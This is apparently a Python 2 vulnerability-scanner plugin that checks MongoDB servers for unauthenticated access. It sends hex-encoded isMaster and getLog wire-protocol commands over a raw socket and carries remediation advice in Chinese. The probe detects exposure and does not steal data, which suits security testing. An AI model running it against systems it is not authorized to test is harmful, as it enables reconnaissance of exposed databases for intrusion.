#!/usr/bin/env python
# -*- coding:utf-8 -*-

'''
    name: mongodb未授权访问
    level: 中危
    type: 未授权访问
    repair: 1、如果为本机使用，仅监听127.0.0.1 
            2、使用主机防火墙来限制源IP地址的访问
            3、对集合（collection）使用用户名/密码认证
'''

import socket,binascii
from POC_Framework import POC

class myPOC(POC):
    
    #单IP的POC
    def check(self, ip, port, timeout=5):
        try:
            socket.setdefaulttimeout(timeout)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            data = binascii.a2b_hex("3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000")
            s.send(data)
            result = s.recv(1024)
            if "ismaster" in result:
                getlog_data = binascii.a2b_hex("480000000200000000000000d40700000000000061646d696e2e24636d6400000000000100000021000000026765744c6f670010000000737461727475705761726e696e67730000")
                s.send(getlog_data)
                result = s.recv(1024)
                if "totalLinesWritten" in result:
                    return True
        except:
            return False

if __name__ == "__main__":

    Check_POC = myPOC()
    Check_POC.run()